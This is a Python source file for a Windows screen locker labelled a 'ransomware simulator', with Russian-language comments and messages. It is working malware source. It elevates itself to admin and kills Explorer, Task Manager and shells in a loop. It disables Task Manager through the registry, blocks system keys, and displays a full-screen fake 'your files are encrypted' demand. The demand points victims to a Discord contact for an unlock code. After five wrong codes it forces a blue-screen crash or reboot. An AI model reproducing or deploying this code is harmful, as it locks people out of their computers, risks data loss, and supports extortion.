# -*- coding: utf-8 -*-
"""
GRIFERS RANSOMWARE SIMULATOR - ПОЛНОЭКРАННЫЕ КОМАНДНЫЕ СТРОКИ
Каждое окно открывается на ВЕСЬ ЭКРАН (как F11)
Каждые 2 секунды новое окно с разным цветом фона
Discord: mrgrishast_51442
Code: 777
"""
import tkinter as tk
from tkinter import messagebox, ttk
import ctypes
import os
import sys
import socket
import threading
import time
import subprocess

# ==================== ФУНКЦИЯ ДЛЯ ПОЛНОЭКРАННОЙ КОМАНДНОЙ СТРОКИ ====================

def create_fullscreen_console_with_death(color_code, color_name, title_text, duration=2):
    """Создаёт ПОЛНОЭКРАННУЮ командную строку с указанным цветом фона и смертью"""
    
    bat_content = f'''@echo off
title {title_text}
mode con cols=200 lines=60
color {color_code}
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo             ;::::; 
echo           ;::::; :; 
echo         ;:::::'   :; 
echo        ;:::::;     ;. 
echo       ,:::::'       ;           OOO\ 
echo       ::::::;       ;          OOOOO\ 
echo       ;:::::;       ;         OOOOOOOO 
echo      ,;::::::;     ;'         / OOOOOOO 
echo    ;:::::::::`. ,,,;.        /  / DOOOOOO 
echo  .';:::::::::::::::::;,     /  /     DOOOO 
echo ,::::::;::::::;;;;::::;,   /  /        DOOO 
echo ;`::::::`'::::::;;;::::: ,#/  /          DOOO 
echo :`:::::::`;::::::;;::: ;::#  /            DOOO 
echo ::`:::::::`;:::::::: ;::::# /              DOO 
echo `:`:::::::`;:::::: ;::::::#/               DOO 
echo :::`:::::::`;; ;:::::::::##                OO 
echo ::::`:::::::`;::::::::;:::#                OO 
echo `:::::`::::::::::::;'`:;::#                O 
echo   `:::::`::::::::;' /  / `:# 
echo    ::::::`:::::;'  /  /   `#
timeout /t {duration} /nobreak >nul
exit
'''
    
    bat_path = os.path.join(os.environ['TEMP'], f'grifers_{color_name}.bat')
    with open(bat_path, 'w', encoding='utf-8') as f:
        f.write(bat_content)
    
    subprocess.Popen(f'start cmd /c "{bat_path}"', shell=True)
    time.sleep(0.3)
    
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)
            ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)
            ctypes.windll.user32.keybd_event(0x0D, 0, 0, 0)
            time.sleep(0.05)
            ctypes.windll.user32.keybd_event(0x0D, 0, 2, 0)
            ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)
    except:
        pass
    
    return bat_path

# ==================== МГНОВЕННАЯ БЛОКИРОВКА ====================
def instant_lock():
    """МГНОВЕННАЯ блокировка системы"""
    try:
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        os.system("taskkill /f /im cmd.exe >nul 2>&1")
        os.system("taskkill /f /im powershell.exe >nul 2>&1")
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1')
    except:
        pass

# ==================== КОНФИГ ====================
UNLOCK_CODE = "1048883049"
PC_NAME = socket.gethostname()
DISCORD_CONTACT = "mrgrishast_51442"

class GrifersRansomwareSimulator:
    def __init__(self):
        self.root = None
        self.entry = None
        self.attempts = 0
        self.max_attempts = 5
        
        # Мгновенная блокировка
        instant_lock()
        
        # ПОСЛЕДОВАТЕЛЬНЫЙ ЗАПУСК ПОЛНОЭКРАННЫХ КОМАНДНЫХ СТРОК
        # 1. Красный фон (2 секунды)
        create_fullscreen_console_with_death('04', 'red', 'GRIFERS - СМЕРТЬ', 2)
        time.sleep(2)
        
        # 2. Синий фон (2 секунды)
        create_fullscreen_console_with_death('01', 'blue', 'GRIFERS - ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ', 2)
        time.sleep(2)
        
        # 3. Зеленый фон (2 секунды)
        create_fullscreen_console_with_death('02', 'green', 'GRIFERS - ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ', 2)
        time.sleep(2)
        
        # 4. Фиолетовый фон (2 секунды)
        create_fullscreen_console_with_death('05', 'purple', 'GRIFERS - ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ', 2)
        time.sleep(2)
        
        # 5. Снова красный фон для финала
        create_fullscreen_console_with_death('04', 'red_final', 'GRIFERS - ВАШИ ФАЙЛЫ УНИЧТОЖЕНЫ', 2)
        time.sleep(1)
        
        self.create_gui()
        
    def create_gui(self):
        """Создание GUI как на картинке"""
        self.root = tk.Tk()
        self.root.title("Ваши файлы зашифрованы!")
        
        try:
            sw = self.root.winfo_screenwidth()
            sh = self.root.winfo_screenheight()
        except:
            sw, sh = 1920, 1080
            
        self.root.geometry(f"{sw}x{sh}+0+0")
        self.root.configure(bg='#0000aa')
        
        try:
            self.root.overrideredirect(True)
            self.root.attributes('-topmost', True)
            self.root.attributes('-fullscreen', True)
        except:
            pass
        
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.block_keys()
        
        # ==================== ИНТЕРФЕЙС ====================
        main_frame = tk.Frame(self.root, bg='#0000aa')
        main_frame.place(relx=0.5, rely=0.45, anchor=tk.CENTER)
        
        # Заголовок
        title = tk.Label(main_frame, text="Ваши файлы зашифрованы!",
                        font=('Arial', 28, 'bold'), fg='#ffffff', bg='#0000aa')
        title.pack(pady=(0, 20))
        
        # Основной текст (с Discord)
        main_text = f"""Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован,
а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой.

Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред
Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления.

При попытке снять блокировку MBR (главный загрузчик материнки) будет снесён и будет подана
рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности.

Чтобы получить код, напишите {DISCORD_CONTACT} (Discord)"""
        
        text_label = tk.Label(main_frame, text=main_text, font=('Arial', 13),
                             fg='#ffffff', bg='#0000aa', justify=tk.CENTER)
        text_label.pack(pady=10)
        
        # Поле ввода
        code_label = tk.Label(main_frame, text="Введите код разблокировки:",
                             font=('Arial', 14), fg='#ffffff', bg='#0000aa')
        code_label.pack(pady=(30, 5))
        
        self.entry = tk.Entry(main_frame, font=('Arial', 14), show="",
                              bg='#ffffff', fg='#000000', width=25,
                              relief=tk.SUNKEN, bd=2,
                              justify='center')
        self.entry.pack(ipady=5)
        self.entry.focus()
        self.entry.bind('<Return>', lambda e: self.check_code())
        
        # Информация о ПК и кнопка
        bottom_frame = tk.Frame(main_frame, bg='#0000aa')
        bottom_frame.pack(pady=20)
        
        pc_label = tk.Label(bottom_frame, text=f"Current PC: {PC_NAME}",
                           font=('Arial', 11), fg='#ffffff', bg='#0000aa')
        pc_label.pack(side=tk.LEFT, padx=(0, 20))
        
        enter_btn = tk.Button(bottom_frame, text="Enter [Ввод]", font=('Arial', 11),
                             bg='#e0e0e0', fg='#000000', relief=tk.RAISED, bd=2,
                             padx=20, pady=3, command=self.check_code)
        enter_btn.pack(side=tk.LEFT)
        
        # Счётчик попыток
        self.attempts_label = tk.Label(main_frame, text="", font=('Arial', 10),
                                       fg='#ff6666', bg='#0000aa')
        self.attempts_label.pack(pady=10)
        
        # Постоянная блокировка
        self.keep_locked()
        
        self.root.mainloop()
    
    def keep_locked(self):
        """Постоянная блокировка системы"""
        def lock_thread():
            while True:
                try:
                    os.system("taskkill /f /im explorer.exe >nul 2>&1")
                    os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
                except:
                    pass
                time.sleep(2)
        threading.Thread(target=lock_thread, daemon=True).start()
    
    def block_keys(self):
        def block():
            try:
                import keyboard
                blocked = ['ctrl', 'win', 'windows', 'esc', 'alt', 'f4', 
                          'delete', 'tab', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
                for key in blocked:
                    try:
                        keyboard.block_key(key)
                    except:
                        pass
            except:
                pass
        threading.Thread(target=block, daemon=True).start()
    
    def unlock_system(self):
        try:
            os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f >nul 2>&1')
            os.system("start explorer.exe")
        except:
            pass
        
    def destroy_system(self):
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        except:
            os.system("shutdown /r /t 0 /f")
    
    def show_fake_decryption(self):
        """Фальшивая расшифровка"""
        try:
            dec_window = tk.Toplevel(self.root)
            dec_window.title("Расшифровка...")
            dec_window.geometry("400x120")
            dec_window.configure(bg='#003300')
            dec_window.transient(self.root)
            dec_window.grab_set()
            
            tk.Label(dec_window, text="🔓 РАСШИФРОВКА ФАЙЛОВ... 🔓",
                    font=('Arial', 14, 'bold'), fg='#00ff00', bg='#003300').pack(pady=15)
            
            progress = ttk.Progressbar(dec_window, length=350, mode='determinate')
            progress.pack(pady=10)
            
            for i in range(101):
                progress['value'] = i
                dec_window.update()
                time.sleep(0.01)
            
            dec_window.destroy()
        except:
            pass
            
    def check_code(self):
        code = self.entry.get().strip()
        
        if code == UNLOCK_CODE:
            self.show_fake_decryption()
            self.unlock_system()
            self.root.destroy()
            return
            
        self.attempts += 1
        remaining = self.max_attempts - self.attempts
        
        self.attempts_label.config(text=f"Осталось попыток: {remaining}")
        self.entry.delete(0, tk.END)
        
        if self.attempts >= self.max_attempts:
            self.destroy_system()
        else:
            messagebox.showerror("Неверный код", 
                                f"Неверный код разблокировки!\nОсталось попыток: {remaining}")

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except:
        pass
    
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Grifers_Ransomware_Mutex_V12")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except:
        pass
        
    GrifersRansomwareSimulator()